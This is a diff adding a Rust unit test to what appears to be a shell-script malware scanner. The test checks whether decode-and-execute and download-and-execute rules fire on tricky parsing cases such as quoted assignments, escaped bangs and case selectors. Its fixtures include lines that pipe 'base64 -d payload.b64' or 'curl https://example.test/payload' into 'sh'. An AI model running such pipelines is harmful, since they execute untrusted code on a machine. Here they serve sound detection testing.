@@ -2498,6 +2498,104 @@ fn control_flow_conditions_and_case_patterns_keep_their_syntax_scope() {
 }
 
 #[test]
+fn for_values_case_selectors_and_quoted_prefixes_stay_data() {
+    for value in ["done", "if", "do", "case"] {
+        let source = format!("#!/bin/sh\nfor x in {value}; do base64 -d payload.b64; done | sh\n");
+        let (artifacts, _) = one("for-value.sh", PayloadKind::Shell, &source);
+        assert_eq!(
+            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
+            1,
+            "for x in {value}: {:?}",
+            artifacts.rendered_findings()
+        );
+    }
+
+    let (artifacts, _) = one(
+        "case-selector.sh",
+        PayloadKind::Shell,
+        "#!/bin/sh\ncase in in\n  in) base64 -d payload.b64 ;;\nesac | sh\n",
+    );
+    assert_eq!(
+        findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
+        1,
+        "{:?}",
+        artifacts.rendered_findings()
+    );
+
+    for (name, line, expected) in [
+        (
+            "quoted-assignment.sh",
+            "\"A=B\" curl https://example.test/payload | sh",
+            false,
+        ),
+        (
+            "escaped-assignment.sh",
+            "A\\=B curl https://example.test/payload | sh",
+            false,
+        ),
+        (
+            "plain-assignment.sh",
+            "A=B curl https://example.test/payload | sh",
+            true,
+        ),
+        (
+            "quoted-value-assignment.sh",
+            "A=\"B\" curl https://example.test/payload | sh",
+            true,
+        ),
+        ("quoted-bang.sh", "\"!\" base64 -d payload.b64 | sh", false),
+        ("escaped-bang.sh", "\\! base64 -d payload.b64 | sh", false),
+    ] {
+        let source = format!("#!/bin/sh\n{line}\n");
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        let rule = if line.contains("curl") {
+            SCRIPT_DOWNLOAD_EXECUTE_RULE
+        } else {
+            SCRIPT_DECODE_EXECUTE_RULE
+        };
+        assert_eq!(
+            findings_with(&artifacts, rule).len(),
+            usize::from(expected),
+            "{name}: {:?}",
+            artifacts.rendered_findings()
+        );
+    }
+
+    for (name, line, expected) in [
+        (
+            "compound-assignment.sh",
+            "A=B (base64 -d payload.b64) | sh",
+            true,
+        ),
+        (
+            "quoted-compound-assignment.sh",
+            "\"A=B\" (base64 -d payload.b64) | sh",
+            false,
+        ),
+        (
+            "escaped-compound-assignment.sh",
+            "A\\=B (base64 -d payload.b64) | sh",
+            false,
+        ),
+        ("compound-bang.sh", "! (base64 -d payload.b64) | sh", true),
+        (
+            "quoted-compound-bang.sh",
+            "\"!\" (base64 -d payload.b64) | sh",
+            false,
+        ),
+    ] {
+        let source = format!("#!/bin/sh\n{line}\n");
+        let (artifacts, _) = one(name, PayloadKind::Shell, &source);
+        assert_eq!(
+            findings_with(&artifacts, SCRIPT_DECODE_EXECUTE_RULE).len(),
+            usize::from(expected),
+            "{name}: {:?}",
+            artifacts.rendered_findings()
+        );
+    }
+}
+
+#[test]
 fn logical_units_join_multiline_pipelines() {
     // An escaped newline and a trailing pipe both continue the command;
     // the finding keeps the STARTING line.
